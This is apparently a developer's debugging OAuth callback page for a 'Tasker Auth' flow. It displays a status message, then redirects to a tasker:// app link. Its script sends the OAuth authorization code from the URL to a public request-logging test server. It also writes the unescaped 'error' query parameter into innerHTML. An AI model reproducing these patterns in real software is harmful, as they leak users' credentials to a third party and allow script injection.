<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />	
	<style>
		@import url('https://fonts.googleapis.com/css?family=Roboto');
	</style>
	<style type="text/css">
		html, body {
			overflow: hidden;
			font-family: 'Roboto', sans-serif;
			background-color: #E5822D;
			color: white;
			display: flex;
			flex-direction: column;
			height: 100vh;
			justify-content: center;
		}
		#wrapper {
			box-sizing: border-box;
			display: flex;
			flex-direction: column;
			align-items: center;
			margin: 2vh;
			text-align: center;
		}
	</style>
	<title>Tasker Auth</title>
</head>
<body>
	<div id="wrapper">Loading...</div>

	<script type="text/javascript">
		function getQueryVariable(variable) {
			const query = window.location.search.substring(1);
			const vars = query.split("&");
			for (let i = 0; i < vars.length; i++) {
				const pair = vars[i].split("=");
				if (pair[0] === variable) {
					return decodeURIComponent(pair[1]);
				}
			}
			return null;
		}

		// Ambil parameter code/error
		const code = getQueryVariable("code");
		const error = getQueryVariable("error");
		const toSend = code || error || "no_code";
		const toRedirect = `tasker://auth${window.location.search}`;
		const wrapper = document.getElementById("wrapper");

		// Tampilkan status di layar
		if (error) {
			wrapper.innerHTML = `Error authenticating: ${error}<br/>Sending header...`;
		} else {
			wrapper.innerHTML = `Authentication successful!<br/>Sending header...`;
		}

		// Buat request GET dengan header "code"
		const xhr = new XMLHttpRequest();
		xhr.open("GET", "https://posttestserver.dev/p/oauth/post", true);
		xhr.setRequestHeader("code", toSend);

		xhr.onreadystatechange = function () {
			if (xhr.readyState === 4) {
				console.log("Response:", xhr.status, xhr.responseText);
				if (xhr.status >= 200 && xhr.status < 300) {
					wrapper.innerHTML = "Header sent successfully!<br/>Redirecting to Tasker...";
				} else {
					wrapper.innerHTML = "Error sending header (status " + xhr.status + ")<br/>Redirecting anyway...";
				}
				setTimeout(() => {
					window.location.href = toRedirect;
				}, 600);
			}
		};

		try {
			xhr.send();
		} catch (e) {
			console.error("XHR send failed:", e);
			wrapper.innerHTML = "Failed to send header.<br/>Redirecting...";
			setTimeout(() => {
				window.location.href = toRedirect;
			}, 800);
		}
	</script>
</body>
</html>
